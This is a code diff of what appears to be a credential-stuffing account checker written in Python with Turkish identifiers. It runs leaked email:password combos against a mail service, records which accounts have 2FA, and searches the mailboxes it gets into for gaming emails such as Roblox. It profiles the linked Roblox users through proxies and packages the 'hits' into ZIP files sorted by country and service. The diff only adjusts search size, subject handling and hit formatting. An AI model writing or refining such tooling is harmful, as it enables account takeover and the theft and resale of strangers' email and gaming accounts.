@@ -504,10 +504,6 @@ class marazali:
                 return parsedate_to_datetime(date_str).strftime('%Y-%m-%d %H:%M:%S')
             except:
                 pass
-        preview = result.get("Preview", "") or result.get("BodyPreview", "")
-        m = re.search(r'(\d{1,2}[/\.-]\d{1,2}[/\.-]\d{2,4})', preview)
-        if m:
-            return m.group(1)
         return "N/A"
 
     def search_messages(self, tag, game_key, token):
@@ -531,10 +527,10 @@ class marazali:
                     "From": 0,
                     "Query": {"QueryString": query},
                     "RefiningQueries": None,
-                    "Size": 500,
+                    "Size": 25,
                     "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                     "EnableTopResults": True,
-                    "TopResultsCount": 5
+                    "TopResultsCount": 3
                 }],
                 "QueryAlterationOptions": {
                     "EnableSuggestion": True,
@@ -556,8 +552,7 @@ class marazali:
                 data = r.json()
                 total = 0
                 tarih = "N/A"
-                subject = ""
-                preview = ""
+                subject = "No Subject"
                 for es in data.get("EntitySets", []):
                     if es.get("Total") is not None:
                         total = es.get("Total", 0)
@@ -567,17 +562,16 @@ class marazali:
                     if results:
                         first = results[0]
                         tarih = self._tarih(first)
-                        subject = (first.get("Subject", "") or first.get("ConversationTopic", ""))[:80]
-                        preview = (first.get("Preview", "") or first.get("BodyPreview", ""))[:80]
+                        subject = (first.get("ConversationTopic", "") or first.get("Subject", ""))[:80]
                         break
                 if total == 0:
                     m = re.search(r'"Total":\s*(\d+)', r.text)
                     if m:
                         total = int(m.group(1))
-                return total, tarih, subject, preview
-            return 0, "N/A", "", ""
+                return total, tarih, subject
+            return 0, "N/A", "No Subject"
         except:
-            return 0, "N/A", "", ""
+            return 0, "N/A", "No Subject"
 
     def check(self, tag):
         status = self.nihathatipoglu(tag)
@@ -591,8 +585,8 @@ class marazali:
         time.sleep(0.3)
         mesaj_info = {}
         for game_key in GAME_EMAILS:
-            sayi, tarih, subj, prev = self.search_messages(tag, game_key, token)
-            mesaj_info[game_key] = {"sayi": sayi, "tarih": tarih, "subject": subj, "preview": prev}
+            sayi, tarih, subj = self.search_messages(tag, game_key, token)
+            mesaj_info[game_key] = {"sayi": sayi, "tarih": tarih, "subject": subj}
             time.sleep(0.2)
         return "SUCCESS", mesaj_info
 
@@ -844,11 +838,10 @@ def tarama_yap(chat_id, accounts, dosya_adi):
                             if sayi and sayi > 0:
                                 tarih = m_info.get("tarih", "N/A")
                                 subj = m_info.get("subject", "")
-                                prev = m_info.get("preview", "")
                                 state["keyword_sayaci"][game_key] = state["keyword_sayaci"].get(game_key, 0) + 1
 
                                 if game_key == "roblox":
-                                    kullanici = roblox_eruu(prev + " " + subj)
+                                    kullanici = roblox_eruu(subj)
                                     if kullanici:
                                         rd = roblox_rlll(kullanici, formatted_proxy)
                                         wearing = ", ".join(rd["wearing"]) if rd["wearing"] else ""
@@ -856,15 +849,13 @@ def tarama_yap(chat_id, accounts, dosya_adi):
                                                    f"Banned = {rd['banned']} | Created = {rd['created']} | "
                                                    f"Profile = {rd['profile']} | Wearing = [{wearing}]")
                                     else:
-                                        s_detay = "🎲 ROBLOX | Username = ???"
+                                        s_detay = f"🎲 ROBLOX | {subj}"
                                 else:
                                     lbl = GAME_EMAILS[game_key]["label"]
-                                    s_detay = f"{lbl} ({sayi})"
-                                    if subj:
-                                        s_detay += f" [{subj}]"
+                                    s_detay = f"{lbl} ({sayi}) | {subj}"
                                 
                                 hesap_detaylari.append(s_detay)
-                                hesap_keyword_listesi.append((game_key, s_detay))
+                                hesap_keyword_listesi.append((game_key, f"{combo} | {ulke} | {isim} | {s_detay} | {tarih}"))
 
                     if hesap_detaylari:
                         birlesik_detay = " | ".join(hesap_detaylari)
@@ -874,10 +865,9 @@ def tarama_yap(chat_id, accounts, dosya_adi):
 
                     state["ulke_icerik"].setdefault(ulke, []).append(satir)
 
-                    for k_game, k_detay in hesap_keyword_listesi:
-                        k_satir = f"{combo} | {ulke} | {isim} | {k_detay}"
+                    for k_game, k_satir in hesap_keyword_listesi:
                         state["keyword_icerik"].setdefault(k_game, []).append(k_satir)
-                        print(f"[HIT] {k_game} | {ulke} | {combo}", flush=True)
+                        print(f"[HIT] {k_satir}", flush=True)
                 elif status == "2FA":
                     state["twofa"] += 1
                     state["twofa_icerik"].append(combo)
@@ -952,7 +942,7 @@ def tarama_yap(chat_id, accounts, dosya_adi):
 
     print(f"[ZIP] all_hits={len(state['all_hits_icerik'])} 2fa={len(state['twofa_icerik'])} ulke={len(state['ulke_icerik'])} keyword={len(state['keyword_icerik'])}", flush=True)
 
-    tarih = datetime.now().strftime('%d-%m-%Y')
+    tarih_zip = datetime.now().strftime('%d-%m-%Y')
     try:
         with zipfile.ZipFile(ZIP_FILE, 'w', zipfile.ZIP_DEFLATED) as zf:
             buf = io.StringIO()
@@ -971,7 +961,7 @@ def tarama_yap(chat_id, accounts, dosya_adi):
                 for line in satirlar:
                     buf.write(line + "\n")
                 n = state["ulke_sayaci"].get(kod, len(satirlar))
-                arc = f"countries/{kod} ({n} hit) ({tarih}).txt"
+                arc = f"countries/{kod} ({n} hit) ({tarih_zip}).txt"
                 zf.writestr(arc, buf.getvalue())
                 print(f"[ZIP+] {arc} ({len(satirlar)} lines)", flush=True)
 
@@ -980,7 +970,7 @@ def tarama_yap(chat_id, accounts, dosya_adi):
                 for line in satirlar:
                     buf.write(line + "\n")
                 n = state["keyword_sayaci"].get(svc, len(satirlar))
-                arc = f"keywords/{svc} ({n} hit) ({tarih}).txt"
+                arc = f"keywords/{svc} ({n} hit) ({tarih_zip}).txt"
                 zf.writestr(arc, buf.getvalue())
                 print(f"[ZIP+] {arc} ({len(satirlar)} lines)", flush=True)
     except Exception as e:
